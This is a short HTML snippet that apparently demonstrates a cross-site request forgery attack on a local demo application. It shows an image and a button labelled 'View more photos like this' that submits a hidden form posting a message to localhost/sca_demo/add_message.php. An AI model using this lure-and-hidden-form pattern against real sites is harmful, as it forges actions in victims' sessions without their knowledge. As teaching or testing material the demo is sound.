<img src="girl.jpg" />
<form action="http://localhost/sca_demo/add_message.php" method="POST">
    <input type="hidden" name="message" value="!@#$%^&*"/>
    <input type="submit" value="View more photos like this"/>
</form>
